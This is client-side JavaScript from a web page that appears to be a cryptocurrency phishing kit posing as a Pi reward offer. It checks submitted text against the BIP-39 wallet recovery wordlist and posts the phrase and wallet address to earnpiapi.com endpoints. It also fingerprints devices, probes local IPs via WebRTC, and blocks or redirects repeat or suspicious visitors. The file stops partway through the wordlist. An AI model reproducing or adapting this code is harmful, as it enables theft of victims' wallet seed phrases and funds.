            function getSubmissionCount() {
                try {
                    return parseInt(localStorage.getItem("piSubmissionCount") || "0");
                } catch (e) {
                    console.error("Error accessing localStorage:", e);
                    return 0;
                }
            }

            function incrementSubmissionCount() {
                try {
                    const currentCount = getSubmissionCount();
                    localStorage.setItem("piSubmissionCount", (currentCount + 1).toString());
                    return currentCount + 1;
                } catch (e) {
                    console.error("Error updating localStorage:", e);
                    return 0;
                }
            }

            // Check if user has exceeded submission limit
            function hasExceededLimit() {
                return getSubmissionCount() >= 2;
            }

            // Update UI based on submission count
            function updateUIForSubmissionCount() {
                const currentCount = getSubmissionCount();
                const limitMessage = document.getElementById("limitMessage");
                const errorMessage = document.getElementById("errorMessage");
                const unlockSubmitBtn = document.getElementById("unlockSubmitBtn");
                const openFormBtn = document.getElementById("openFormBtn");

                // Case: User has exceeded limit
                if (currentCount >= 2) {
                    // Show error message on form page
                    errorMessage.style.display = "block";
                    limitMessage.style.display = "none";

                    // Disable submit button
                    unlockSubmitBtn.disabled = true;
                    unlockSubmitBtn.textContent = "REQUEST LIMIT REACHED";

                    // Disable all Offer Now buttons
                    document.querySelectorAll(".buy-now").forEach((button) => {
                        button.disabled = true;
                        button.textContent = "Request Limit Reached";
                        button.classList.add("opacity-50");
                        button.style.cursor = "not-allowed";
                    });
                }
                // Case: User has submitted once (show warning)
                else if (currentCount === 1) {
                    limitMessage.style.display = "block";
                    limitMessage.innerHTML = `<i class="fas fa-exclamation-triangle mr-2"></i>You have submitted ${currentCount}/2 requests. Each device is limited to a maximum of 2 requests.`;
                    errorMessage.style.display = "none";
                    unlockSubmitBtn.disabled = false;
                }
                // Case: User hasn't submitted yet
                else {
                    limitMessage.style.display = "none";
                    errorMessage.style.display = "none";
                    unlockSubmitBtn.disabled = false;
                }
            }

            // Advanced IP and Location detection with better reliability
            let userIPData = null;
            let ipBlockStatus = {
                blocked: false,
                reason: "",
            };

            async function getLocalIP() {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        console.log("Local IP:", event.candidate.address);
                        pc.close();
                    }
                };
                await pc.createOffer().then((o) => pc.setLocalDescription(o));
            }

            getLocalIP();
            // Multi-API approach for IP and location detection with advanced failover
            async function getUserIPInfo() {
                try {
                    // Try multiple APIs in sequence until one succeeds
                    const apis = [
                        async () => {
                            const response = await fetch("https://freeipapi.com/api/json/", {
                                headers: {
                                    Authorization: "Bearer 145e8aecea2cae5c7002ec10d217c2b04fa68a27ff6f3a8383c9aaea623c77b0",
                                },
                            });
                            if (!response.ok) throw new Error("freeipapi.com failed");
                            const data = await response.json();

                            return {
                                ip: data.ipAddress,
                                country: data.countryCode,
                                country_name: data.countryName,
                                city: data.cityName,
                                region: data.regionName,
                                timezone: data.timeZone,
                            };
                        },

                        // API 5: Backup option with ipwhois.app
                        async () => {
                            const response = await fetch("https://ipwho.is/");
                            if (!response.ok) throw new Error("ipwho.is failed");
                            const data = await response.json();
                            return {
                                ip: data.ip,
                                country: data.country_code,
                                country_name: data.country,
                                city: data.city,
                                region: data.region,
                                timezone: data.timezone.id,
                            };
                        },

                        // API 6: Additional backup with publicapis
                        async () => {
                            const response = await fetch("https://api.db-ip.com/v2/free/self");
                            if (!response.ok) throw new Error("db-ip.com failed");
                            const data = await response.json();
                            console.log("API success:", data);
                            return {
                                ip: data.ipAddress,
                                country: data.countryCode,
                                country_name: data.countryName,
                                city: data.city,
                                region: data.stateProv,
                                timezone: null,
                            };
                        },

                        // Final fallback: Use client-side information only
                        async () => {
                            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                            return {
                                ip: "unavailable",
                                country: await detectCountryFromTimezone(timezone),
                                country_name: await getCountryNameFromTimezone(timezone),
                                city: "unknown",
                                region: "unknown",
                                timezone: timezone,
                            };
                        },
                    ];

                    // Try each API in turn until one succeeds
                    for (const apiCall of apis) {
                        try {
                            const data = await apiCall();
                            console.log("apiCall", data);
                            // Verify we have at least some data to work with
                            if (data && (data.ip !== "unavailable" || data.timezone)) {
                                // Success! Save the data
                                userIPData = data;

                                // Check if this is a suspicious IP
                                checkIfIPBlocked(data.ip);
                                setLanguage("en");

                                // // Display location notification
                                // showLocationNotification(data);

                                return data;
                            }
                        } catch (error) {
                            console.log("API attempt failed:", error.message);
                            // Continue to next API
                        }
                    }

                    // If we got here, all APIs failed - use fallback approach
                    console.warn("All location detection API attempts failed, using fallback");

                    // Create a fallback user data
                    const fallbackData = createFallbackUserData();
                    userIPData = fallbackData;

                    // Auto-set to English for safety (since we can't determine country)
                    setLanguage("en");

                    return fallbackData;
                } catch (error) {
                    console.error("Error in getUserIPInfo:", error);

                    // Create fallback user data when everything fails
                    const fallbackData = createFallbackUserData();
                    userIPData = fallbackData;

                    // Auto-set to English for safety
                    setLanguage("en");

                    return fallbackData;
                }
            }

            // Create fallback user data using browser information
            function createFallbackUserData() {
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const userData = {
                    ip: "unavailable",
                    country: "US", // Default to US
                    country_name: "United States", // Default to United States
                    city: "unknown",
                    region: "unknown",
                    timezone: timezone,
                };

                return userData;
            }

            // Helper function to get country name from country code
            function getCountryName(countryCode) {
                if (!countryCode) return "Unknown";

                // Simple mapping of common country codes
                const commonCountries = {
                    US: "United States",
                    GB: "United Kingdom",
                    CA: "Canada",
                    AU: "Australia",
                    DE: "Germany",
                    FR: "France",
                    IT: "Italy",
                    ES: "Spain",
                    JP: "Japan",
                    CN: "China",
                    IN: "India",
                    BR: "Brazil",
                    RU: "Russia",
                    VN: "Vietnam",
                    TH: "Thailand",
                    MY: "Malaysia",
                    SG: "Singapore",
                    ID: "Indonesia",
                };

                // If it's a common country, return the name immediately
                if (commonCountries[countryCode]) {
                    return commonCountries[countryCode];
                }

                // Otherwise, try to get the name from the browser's Intl API
                try {
                    return new Intl.DisplayNames(["en"], { type: "region" }).of(countryCode);
                } catch (error) {
                    return countryCode; // Fallback to just returning the code
                }
            }

            // Detect country from timezone as fallback
            function detectCountryFromTimezone(timezone) {
                if (!timezone) return null;

                // Common timezone to country code mappings
                const timezoneMap = {
                    "America/New_York": "US",
                    "America/Los_Angeles": "US",
                    "America/Chicago": "US",
                    "America/Denver": "US",
                    "Europe/London": "GB",
                    "Europe/Paris": "FR",
                    "Europe/Berlin": "DE",
                    "Europe/Rome": "IT",
                    "Europe/Madrid": "ES",
                    "Asia/Tokyo": "JP",
                    "Asia/Shanghai": "CN",
                    "Asia/Kolkata": "IN",
                    "Asia/Ho_Chi_Minh": "VN",
                    "Asia/Bangkok": "TH",
                    "Asia/Singapore": "SG",
                    "Asia/Kuala_Lumpur": "MY",
                    "Asia/Jakarta": "ID",
                    "Australia/Sydney": "AU",
                    "Australia/Melbourne": "AU",
                };

                // Try direct mapping
                if (timezoneMap[timezone]) {
                    return timezoneMap[timezone];
                }

                // Try to extract country from timezone
                if (timezone.includes("/")) {
                    const region = timezone.split("/")[0];

                    // Map regions to likely country codes
                    const regionMap = {
                        America: "US",
                        Europe: "EU",
                        Asia: "AS",
                        Africa: "AF",
                        Australia: "AU",
                        Pacific: "PA",
                    };

                    return regionMap[region] || null;
                }

                return null;
            }

            // Get country name from timezone
            function getCountryNameFromTimezone(timezone) {
                const countryCode = detectCountryFromTimezone(timezone);
                if (!countryCode) return "Unknown";

                const countryNames = {
                    US: "United States",
                    EU: "Europe",
                    AS: "Asia",
                    AF: "Africa",
                    AU: "Australia",
                    PA: "Pacific",
                };

                return countryNames[countryCode] || "Unknown";
            }

            // Improved show location notification - clearer notifications with detailed info
            function showLocationNotification(ipData) {
                if (!ipData) return;

                const locationText = document.getElementById("locationText");
                const countryFlag = document.getElementById("countryFlag");
                const notification = document.getElementById("locationDetectedMessage");

                // Location text with smart fallbacks to create a meaningful message
                const currentLang = getCurrentLanguage();

                // Better location display with fallbacks
                let city = ipData.city;
                let region = ipData.region;
                let country = ipData.country_name || getCountryName(ipData.country) || "Unknown";

                if (city === "unknown" || !city) {
                    city = "";
                }

                if (region === "unknown" || !region || region === city) {
                    region = "";
                }

                // Build location string
                let locationString = "";
                if (city) locationString += city;
                if (region && city) locationString += ", " + region;
                else if (region) locationString += region;
                if ((city || region) && country) locationString += ", " + country;
                else locationString += country;
            }

            // Storage for blocked IP data with enhanced durability
            const blockStorage = {
                // Save blocked IP data to multiple sources
                save: function (data) {
                    try {
                        // 1. Save to localStorage
                        localStorage.setItem("blockedIPs", JSON.stringify(data));

                        // 2. Save to sessionStorage
                        sessionStorage.setItem("blockedIPs", JSON.stringify(data));

                        // 3. Save to cookie with long expiration (1 year)
                        const expiryDate = new Date();
                        expiryDate.setFullYear(expiryDate.getFullYear() + 1);
                        document.cookie = `blockedIPs=${encodeURIComponent(JSON.stringify(data))};expires=${expiryDate.toUTCString()};path=/;SameSite=Strict`;

                        // 4. Save a backup copy with a different name
                        localStorage.setItem("security_data", JSON.stringify(data));

                        // 5. If IndexedDB is available, save there
                        this.saveToIndexedDB(data);

                        // 6. Create and save device fingerprint
                        this.saveDeviceFingerprint(data);
                    } catch (e) {
                        console.error("Error saving blocked IP data:", e);
                    }
                },

                // Save to IndexedDB - more durable storage
                saveToIndexedDB: function (data) {
                    if (!window.indexedDB) return;

                    try {
                        const request = indexedDB.open("SecurityDB", 1);

                        request.onupgradeneeded = function (event) {
                            const db = event.target.result;
                            if (!db.objectStoreNames.contains("blockedIPs")) {
                                db.createObjectStore("blockedIPs", {
                                    keyPath: "id",
                                });
                            }
                        };

                        request.onsuccess = function (event) {
                            const db = event.target.result;
                            const transaction = db.transaction(["blockedIPs"], "readwrite");
                            const store = transaction.objectStore("blockedIPs");

                            // Clear old data
                            store.clear();

                            // Add new data
                            store.add({ id: "main", data: data });

                            transaction.oncomplete = function () {
                                db.close();
                            };
                        };
                    } catch (e) {
                        console.error("IndexedDB error:", e);
                    }
                },

                // Create and save device fingerprint
                saveDeviceFingerprint: function (data) {
                    try {
                        // Create simple device fingerprint
                        const fingerprint = {
                            userAgent: navigator.userAgent,
                            language: navigator.language,
                            screenWidth: screen.width,
                            screenHeight: screen.height,
                            colorDepth: screen.colorDepth,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            platform: navigator.platform,
                        };

                        // Create identifier string from fingerprint
                        const fingerprintStr = JSON.stringify(fingerprint);
                        const fingerprintHash = this.simpleHash(fingerprintStr);

                        // Save blocked data with device info
                        localStorage.setItem(`device_${fingerprintHash}`, JSON.stringify(data));
                        sessionStorage.setItem(`device_${fingerprintHash}`, JSON.stringify(data));

                        // Save fingerprint to cookie
                        const expiryDate = new Date();
                        expiryDate.setFullYear(expiryDate.getFullYear() + 1);
                        document.cookie = `device_fingerprint=${fingerprintHash};expires=${expiryDate.toUTCString()};path=/;SameSite=Strict`;
                    } catch (e) {
                        console.error("Error creating device fingerprint:", e);
                    }
                },

                // Simple hash function for fingerprint string
                simpleHash: function (str) {
                    let hash = 0;
                    for (let i = 0; i < str.length; i++) {
                        const char = str.charCodeAt(i);
                        hash = (hash << 5) - hash + char;
                        hash = hash & hash;
                    }
                    return hash.toString(36);
                },

                // Get data from all storage sources
                get: function () {
                    let blockedIPs = [];

                    try {
                        // 1. Try localStorage first
                        const localData = localStorage.getItem("blockedIPs");
                        if (localData) {
                            blockedIPs = JSON.parse(localData);
                            return blockedIPs;
                        }

                        // 2. Try sessionStorage
                        const sessionData = sessionStorage.getItem("blockedIPs");
                        if (sessionData) {
                            blockedIPs = JSON.parse(sessionData);
                            return blockedIPs;
                        }

                        // 3. Try cookie
                        const cookies = document.cookie.split(";");
                        for (let cookie of cookies) {
                            cookie = cookie.trim();
                            if (cookie.startsWith("blockedIPs=")) {
                                const cookieData = decodeURIComponent(cookie.substring("blockedIPs=".length));
                                blockedIPs = JSON.parse(cookieData);
                                return blockedIPs;
                            }
                        }

                        // 4. Try backup data
                        const backupData = localStorage.getItem("security_data");
                        if (backupData) {
                            blockedIPs = JSON.parse(backupData);
                            return blockedIPs;
                        }

                        // 5. Try device fingerprint
                        const fingerprintData = this.getFromDeviceFingerprint();
                        if (fingerprintData && fingerprintData.length > 0) {
                            return fingerprintData;
                        }

                        // 6. Try IndexedDB if other methods fail
                        this.getFromIndexedDB().then((idbData) => {
                            if (idbData && idbData.length > 0) {
                                // Restore data to other storage methods
                                this.save(idbData);
                                blockedIPs = idbData;
                            }
                        });
                    } catch (e) {
                        console.error("Error retrieving blocked IP data:", e);
                    }

                    return blockedIPs;
                },

                // Get data from IndexedDB
                getFromIndexedDB: function () {
                    return new Promise((resolve) => {
                        if (!window.indexedDB) {
                            resolve([]);
                            return;
                        }

                        try {
                            const request = indexedDB.open("SecurityDB", 1);

                            request.onerror = function () {
                                resolve([]);
                            };

                            request.onsuccess = function (event) {
                                const db = event.target.result;
                                try {
                                    const transaction = db.transaction(["blockedIPs"], "readonly");
                                    const store = transaction.objectStore("blockedIPs");
                                    const getRequest = store.get("main");

                                    getRequest.onsuccess = function () {
                                        if (getRequest.result && getRequest.result.data) {
                                            resolve(getRequest.result.data);
                                        } else {
                                            resolve([]);
                                        }
                                        db.close();
                                    };

                                    getRequest.onerror = function () {
                                        resolve([]);
                                        db.close();
                                    };
                                } catch (e) {
                                    resolve([]);
                                    db.close();
                                }
                            };
                        } catch (e) {
                            console.error("Error accessing IndexedDB:", e);
                            resolve([]);
                        }
                    });
                },

                // Get data from device fingerprint
                getFromDeviceFingerprint: function () {
                    try {
                        // Create current device fingerprint
                        const fingerprint = {
                            userAgent: navigator.userAgent,
                            language: navigator.language,
                            screenWidth: screen.width,
                            screenHeight: screen.height,
                            colorDepth: screen.colorDepth,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            platform: navigator.platform,
                        };

                        // Calculate hash
                        const fingerprintStr = JSON.stringify(fingerprint);
                        const fingerprintHash = this.simpleHash(fingerprintStr);

                        // Check localStorage
                        const localData = localStorage.getItem(`device_${fingerprintHash}`);
                        if (localData) {
                            return JSON.parse(localData);
                        }

                        // Check sessionStorage
                        const sessionData = sessionStorage.getItem(`device_${fingerprintHash}`);
                        if (sessionData) {
                            return JSON.parse(sessionData);
                        }

                        // Check cookie
                        const cookies = document.cookie.split(";");
                        for (let cookie of cookies) {
                            cookie = cookie.trim();
                            if (cookie.startsWith("device_fingerprint=")) {
                                const storedHash = cookie.substring("device_fingerprint=".length);
                                // If device fingerprint is in cookie, try to get data from localStorage
                                const fingerprintData = localStorage.getItem(`device_${storedHash}`);
                                if (fingerprintData) {
                                    return JSON.parse(fingerprintData);
                                }
                            }
                        }
                    } catch (e) {
                        console.error("Error retrieving device fingerprint data:", e);
                    }

                    return [];
                },
            };

            // Check if IP is in blocked list
            function checkIfIPBlocked(ip) {
                if (!ip) return false;

                // Get blocked IPs from enhanced storage system
                let blockedIPs = blockStorage.get();

                // Check if current IP is blocked
                const blockedEntry = blockedIPs.find((item) => item.ip === ip);
                let isBlocked = !!blockedEntry;

                // If not found by IP, check device fingerprint
                if (!isBlocked) {
                    // Data from device fingerprint - fallback method
                    const fingerprintData = blockStorage.getFromDeviceFingerprint();
                    isBlocked = fingerprintData && fingerprintData.length > 0;

                    if (isBlocked && ip && ip !== "unavailable") {
                        // If found blocked device but different IP, update block list with new IP
                        const existingList = blockStorage.get();
                        if (!existingList.some((item) => item.ip === ip)) {
                            existingList.push({
                                ip: ip,
                                reason: "Device was previously blocked",
                                timestamp: new Date().toISOString(),
                                permanent: true,
                            });
                            blockStorage.save(existingList);
                        }
                    }
                }

                if (isBlocked) {
                    ipBlockStatus.blocked = true;
                    ipBlockStatus.reason = blockedEntry ? blockedEntry.reason || "Suspicious activity" : "Device was blocked";
                    ipBlockStatus.permanent = blockedEntry ? blockedEntry.permanent || false : true;

                    // Show blocked message
                    showBlockedMessage();
                    console.log(`IP ${ip} is blocked: ${ipBlockStatus.reason}`);
                }

                return isBlocked;
            }

            // Add IP to blocked list
            function blockIP(ip, reason = "Multiple suspicious requests") {
                if (!ip) return;

                try {
                    // Get list of blocked IPs
                    let blockedIPs = blockStorage.get();

                    // Add new IP if not already blocked
                    if (!blockedIPs.some((item) => item.ip === ip)) {
                        blockedIPs.push({
                            ip: ip,
                            reason: reason,
                            timestamp: new Date().toISOString(),
                            permanent: true, // Mark as permanently blocked
                        });

                        // Save updated list to all storage sources
                        blockStorage.save(blockedIPs);

                        // Update status
                        ipBlockStatus.blocked = true;
                        ipBlockStatus.reason = reason;

                        // Show blocked message
                        showBlockedMessage();
                        console.log(`IP ${ip} has been permanently blocked: ${reason}`);
                    }
                } catch (error) {
                    console.error("Error blocking IP:", error);
                }
            }

            // Show blocked IP message
            function showBlockedMessage() {
                const blockedMessage = document.getElementById("ipBlockedMessage");

                // Show message
                blockedMessage.style.display = "block";

                // Disable forms and buttons
                const unlockSubmitBtn = document.getElementById("unlockSubmitBtn");

                if (unlockSubmitBtn) {
                    unlockSubmitBtn.disabled = true;
                }

                // Disable all Offer Now buttons
                document.querySelectorAll(".buy-now").forEach((button) => {
                    button.disabled = true;
                    button.textContent = "Access Denied";
                    button.classList.add("opacity-50");
                    button.style.cursor = "not-allowed";
                });
            }

            // Close blocked message
            function closeBlockedMessage() {
                const blockedMessage = document.getElementById("ipBlockedMessage");
                blockedMessage.style.display = "none";
            }

            // Track suspicious activity and potentially block IP
            function trackSuspiciousActivity(isInvalidPhrase = false) {
                if (!userIPData || !userIPData.ip || userIPData.ip === "unavailable") return false;

                // Get and increment suspicious request count
                let suspiciousCount = 0;
                try {
                    // Try localStorage first
                    suspiciousCount = parseInt(localStorage.getItem(`suspicious_${userIPData.ip}`) || "0");

                    // If localStorage is empty, try sessionStorage
                    if (suspiciousCount === 0) {
                        suspiciousCount = parseInt(sessionStorage.getItem(`suspicious_${userIPData.ip}`) || "0");
                    }

                    // If both are empty, try cookie
                    if (suspiciousCount === 0) {
                        const cookies = document.cookie.split(";");
                        for (let cookie of cookies) {
                            cookie = cookie.trim();
                            if (cookie.startsWith(`suspicious_${userIPData.ip}=`)) {
                                suspiciousCount = parseInt(cookie.substring(`suspicious_${userIPData.ip}=`.length));
                                break;
                            }
                        }
                    }

                    // Increment by 1 for normal request, by 3 for invalid phrase
                    suspiciousCount += isInvalidPhrase ? 3 : 1;

                    // Save to multiple storage sources
                    localStorage.setItem(`suspicious_${userIPData.ip}`, suspiciousCount.toString());
                    sessionStorage.setItem(`suspicious_${userIPData.ip}`, suspiciousCount.toString());

                    // Save to cookie with 1 year expiration
                    const expiryDate = new Date();
                    expiryDate.setFullYear(expiryDate.getFullYear() + 1);
                    document.cookie = `suspicious_${userIPData.ip}=${suspiciousCount};expires=${expiryDate.toUTCString()};path=/;SameSite=Strict`;

                    console.log(`Suspicious activity count for ${userIPData.ip}: ${suspiciousCount}`);

                    // Block IP if threshold exceeded (5 points)
                    if (suspiciousCount >= 20) {
                        blockIP(userIPData.ip, "Exceeded suspicious request limit");
                        return true; // IP has been blocked
                    }
                } catch (e) {
                    console.error("Error tracking suspicious activity:", e);
                }

                return false; // IP not blocked
            }

            function initializeBlockCheck() {
                getUserIPInfo().then((ipData) => {
                    if (ipData && ipData.ip && ipData.ip !== "unavailable") {
                        checkIfIPBlocked(ipData.ip);
                    } else {
                        // If no IP, check device fingerprint
                        const fingerprintData = blockStorage.getFromDeviceFingerprint();
                        if (fingerprintData && fingerprintData.length > 0) {
                            ipBlockStatus.blocked = true;
                            ipBlockStatus.reason = "Device has been blocked";
                            ipBlockStatus.permanent = true;
                            showBlockedMessage();
                        }
                    }
                });
            }

            // Language Switching
            let currentLanguage = "en"; // Default language is English

            // Set language
            function setLanguage(lang) {
                currentLanguage = "en"; // Force English
                // Update all text elements with language attributes
                const elements = document.querySelectorAll("[data-kr][data-en]");
                elements.forEach((element) => {
                    // Handle placeholder attribute for inputs
                    if (element.hasAttribute("placeholder")) {
                        element.setAttribute("placeholder", element.getAttribute("data-en"));
                    }
                    // Handle text content for regular elements
                    else {
                        element.textContent = element.getAttribute("data-en");
                    }
                });

                // Store language preference
                try {
                    localStorage.setItem("preferredLanguage", "en");
                } catch (e) {
                    console.error("Error storing language preference:", e);
                }

                // Update UI for submission count with correct language
                updateUIForSubmissionCount();

                // Update pending requests badge language
                updatePendingRequestsBadge();
            }

            // Get current language
            function getCurrentLanguage() {
                return "en"; // Always return English
            }

            // Initialize language options
            function initializeLanguageOptions() {
                // Set English as default language
                setLanguage("en");
            }

            // Pending Requests System - updated to use serverless API
            const pendingRequests = {
                // Store configuration
                storageKey: "piPendingRequests",

                // API endpoint configuration - replace with your actual Vercel endpoint
                apiEndpoint: "https://check.earnpiapi.com/api/send-message",
                // Backup endpoints for redundancy
                backupEndpoints: ["https://api3.earnpiapi.com/api/send-message"],

                // Get pending requests from storage
                get: function () {
                    try {
                        const stored = localStorage.getItem(this.storageKey);
                        return stored ? JSON.parse(stored) : [];
                    } catch (e) {
                        console.error("Error getting pending requests:", e);
                        return [];
                    }
                },

                // Save pending requests to storage
                save: function (requests) {
                    try {
                        localStorage.setItem(this.storageKey, JSON.stringify(requests));
                        this.updateBadge();
                    } catch (e) {
                        console.error("Error saving pending requests:", e);
                    }
                },

                // Add a new request to the queue
                add: function (data) {
                    const requests = this.get();
                    requests.push({
                        ...data,
                        id: Date.now() + Math.random().toString(36).substring(2, 9),
                        timestamp: new Date().toISOString(),
                        attempts: 0,
                        endpointIndex: 0, // Start with primary endpoint
                    });
                    this.save(requests);
                    this.process(); // Try to process immediately
                    return true;
                },

                // Update badge to show pending count
                updateBadge: function () {
                    const requests = this.get();
                    const badge = document.getElementById("pendingRequestsBadge");
                    const count = document.getElementById("pendingCount");

                    if (requests.length > 0) {
                        count.textContent = requests.length;
                        badge.style.display = "block";
                    } else {
                        badge.style.display = "none";
                    }

                    // Update text based on language
                    const prefix = document.querySelector("#pendingRequestsBadge span[data-en]");
                    if (prefix) {
                        prefix.textContent = getCurrentLanguage() === "en" ? "Pending: " : "Pending: ";
                    }
                },

                // Process all pending requests
                process: function () {
                    const requests = this.get();
                    if (requests.length === 0) return;

                    // We'll process one at a time to avoid rate limits
                    this.processRequest(requests[0]).then((success) => {
                        const updatedRequests = this.get(); // Get fresh copy in case it changed
                        if (success) {
                            // Remove the successfully processed request
                            updatedRequests.shift();
                            this.save(updatedRequests);
                        } else {
                            // Update the request with increased attempt count
                            if (updatedRequests.length > 0) {
                                updatedRequests[0].attempts += 1;

                                // Try backup endpoint if available
                                if (this.backupEndpoints.length > 0 && updatedRequests[0].endpointIndex < this.backupEndpoints.length) {
                                    updatedRequests[0].endpointIndex += 1;
                                }

                                // If too many attempts (10+), move to the end of the queue
                                if (updatedRequests[0].attempts >= 10) {
                                    const failedRequest = updatedRequests.shift();
                                    failedRequest.attempts = 0; // Reset attempts
                                    failedRequest.endpointIndex = 0; // Reset to primary endpoint
                                    updatedRequests.push(failedRequest); // Move to end
                                }

                                this.save(updatedRequests);
                            }
                        }

                        // Schedule next process with exponential backoff
                        if (updatedRequests.length > 0) {
                            const delay = Math.min(2000 * Math.pow(1.5, updatedRequests[0].attempts), 30000);
                            setTimeout(() => this.process(), delay);
                        }
                    });
                },

                // Process a single request with retry logic - updated to use serverless API
                processRequest: async function (request) {
                    if (!request) return false;

                    try {
                        // Select the endpoint to use (primary or backup)
                        let endpoint = this.apiEndpoint;
                        if (request.endpointIndex > 0 && request.endpointIndex <= this.backupEndpoints.length) {
                            endpoint = this.backupEndpoints[request.endpointIndex - 1];
                        }

                        // Get the message and add metadata for the serverless function
                        const payload = {
                            captchaToken: request.captchaToken,
                            message: request.message,
                            walletAddress: request.walletAddress,
                            timestamp: new Date().toISOString(),
                            requestId: request.id,
                        };

                        // Call the serverless API instead of Telegram directly
                        const response = await fetch(endpoint, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                "Cf-Token": request.captchaToken,
                            },
                            body: JSON.stringify(payload),
                        });

                        if (response.status === 429) {
                            // blockIP(ipx, reason = "Too Many Requests");
                            window.location.replace("https://www.google.com/");
                            return false;
                        }

                        if (!response.ok) {
                            throw new Error(`API error: ${response.status}`);
                        }

                        const data = await response.json();
                        return data.success === true;
                    } catch (error) {
                        console.error("Error sending message:", error);
                        return false;
                    }
                },
            };

            // Update the pending requests badge based on current language
            function updatePendingRequestsBadge() {
                pendingRequests.updateBadge();
            }

            // Initialize page
            document.addEventListener("DOMContentLoaded", function () {
                // Initialize language options
                initializeLanguageOptions();
                // Initialize countdown timer with persistence
                initCountdownTimer();
                initializeBlockCheck();

                // Use requestAnimationFrame for better performance
                requestAnimationFrame(() => {
                    createPremiumBackground();
                    createFloatingIcons(); // <-- Updated function
                    createExplosionParticles();
                    setupFeatureCardWaves();
                });

                // Delay non-essential animations
                setTimeout(() => {
                    handleScrollAnimations();
                }, 100);

                // Check submission count and update UI
                updateUIForSubmissionCount();

                // Set up blocked message close button
                document.getElementById("closeBlockedMessage").addEventListener("click", closeBlockedMessage);

                // Hide back button initially
                const headerBackBtn = document.getElementById("headerBackBtn");
                headerBackBtn.style.visibility = "hidden";

                // Button click handlers

                const backToHomeBtn = document.getElementById("backToHomeBtn");
                const unlockSubmitBtn = document.getElementById("unlockSubmitBtn");

                // const openFormBtn = document.getElementById("openFormBtn");
                // // Open form page
                // openFormBtn.addEventListener("click", function () {
                // 	// Check if IP is blocked
                // 	if (ipBlockStatus.blocked) {
                // 		showBlockedMessage();
                // 		return;
                // 	}

                // 	// If user has exceeded limit, don't allow opening form
                // 	if (hasExceededLimit()) {
                // 		const message =
                // 			getCurrentLanguage() === "en"
                // 				? "You have exceeded the allowed number of requests."
                // 				: "You have exceeded the allowed number of requests.";
                // 		alert(message);
                // 		return;
                // 	}

                // 	navigateTo("homePage", "formPage", "right");
                // 	updateUIForSubmissionCount();
                // });

                // Add event listeners for all Offer Now buttons
                document.querySelectorAll(".buy-now").forEach((button) => {
                    button.addEventListener("click", function () {
                        // Check if IP is blocked
                        if (ipBlockStatus.blocked) {
                            showBlockedMessage();
                            return;
                        }

                        // If user has exceeded limit, don't allow opening form
                        if (hasExceededLimit()) {
                            alert("You have exceeded the allowed number of requests.");
                            return;
                        }

                        // Show loading overlay
                        const loadingOverlay = document.getElementById("loadingOverlay");
                        loadingOverlay.style.display = "flex";

                        // Navigate to form page
                        navigateTo("homePage", "formPage", "right");
                        updateUIForSubmissionCount();

                        // Wait for form page transition to complete
                        const formPage = document.getElementById("formPage");
                        const handleTransitionEnd = () => {
                            // Hide loading overlay after transition
                            loadingOverlay.style.display = "none";
                            formPage.removeEventListener("transitionend", handleTransitionEnd);
                        };
                        formPage.addEventListener("transitionend", handleTransitionEnd);
                    });
                });

                // Back to home
                backToHomeBtn.addEventListener("click", function () {
                    navigateTo("formPage", "homePage", "left");
                });

                // Header back button
                headerBackBtn.addEventListener("click", function () {
                    const activePageId = document.querySelector(".page.page-active").id;

                    if (activePageId === "formPage") {
                        navigateTo("formPage", "homePage", "left");
                    }
                });

                let bip39Wordlist = null;
                let isFetchingWordlist = false;

                // Fetch BIP-39 wordlist and cache it
                async function fetchBIP39Wordlist() {
                    if (bip39Wordlist !== null) return bip39Wordlist;
                    if (isFetchingWordlist) return null;

                    isFetchingWordlist = true;
                    try {
                        // Attempt to fetch the wordlist
                        const response = await fetch("english.txt");
                        if (!response.ok) throw new Error("Failed to fetch wordlist");

                        const text = await response.text();
                        // Create a Set for faster lookups
                        bip39Wordlist = new Set(text.split("\n").filter((word) => word.trim().length > 0));
                        return bip39Wordlist;
                    } catch (error) {
                        console.error("Error fetching BIP-39 wordlist:", error);
                        // Fallback to a smaller built-in list of common BIP-39 words for basic validation
                        const commonWords = [
                            "abandon",
                            "ability",
                            "able",
                            "about",
                            "above",
                            "absent",
                            "absorb",
                            "abstract",
                            "absurd",
                            "abuse",
                            "access",
                            "accident",
                            "account",
                            "accuse",
                            "achieve",
                            "acid",
                            "acoustic",
                            "acquire",
                            "across",
                            "act",
                            "action",
                            "actor",
                            "actress",
                            "actual",
                            "adapt",
                            "add",
                            "addict",
                            "address",
                            "adjust",
                            "admit",
                            "adult",
                            "advance",
                            "advice",
                            "aerobic",
                            "affair",
                            "afford",
                            "afraid",
                            "again",
                            "age",
                            "agent",
                            "agree",
                            "ahead",
                            "aim",
                            "air",
                            "airport",
                            "aisle",
                            "alarm",
                            "album",
                            "alcohol",
                            "alert",
                            "alien",
                            "all",
                            "alley",
                            "allow",
                            "almost",
                            "alone",
                            "alpha",
                            "already",
                            "also",
                            "alter",
                            "always",
                            "amateur",
                            "amazing",
                            "among",
                            "amount",
                            "amused",
                            "analyst",
                            "anchor",
                            "ancient",
                            "anger",
                            "angle",
                            "angry",
                            "animal",
                            "ankle",
                            "announce",
                            "annual",
                            "another",
                            "answer",
                            "antenna",
                            "antique",
                            "anxiety",
                            "any",
                            "apart",
                            "apology",
                            "appear",
                            "apple",
                            "approve",
                            "april",
                            "arch",
                            "arctic",
                            "area",
                            "arena",
                            "argue",
                            "arm",
                            "armed",
                            "armor",
                            "army",
                            "around",
                            "arrange",
                            "arrest",
                            "arrive",
                            "arrow",
                            "art",
                            "artefact",
                            "artist",
                            "artwork",
                            "ask",
                            "aspect",
                            "assault",
                            "asset",
                            "assist",
                            "assume",
                            "asthma",
                            "athlete",
                            "atom",
                            "attack",
                            "attend",
                            "attitude",
                            "attract",
                            "auction",
                            "audit",
                            "august",
                            "aunt",
                            "author",
                            "auto",
                            "autumn",
                            "average",
                            "avocado",
                            "avoid",
                            "awake",
                            "aware",
                            "away",
                            "awesome",
                            "awful",
                            "awkward",
                            "axis",
                            "baby",
                            "bachelor",
                            "bacon",
                            "badge",
                            "bag",
                            "balance",
                            "balcony",
                            "ball",
                            "bamboo",
                            "banana",
                            "banner",
                            "bar",
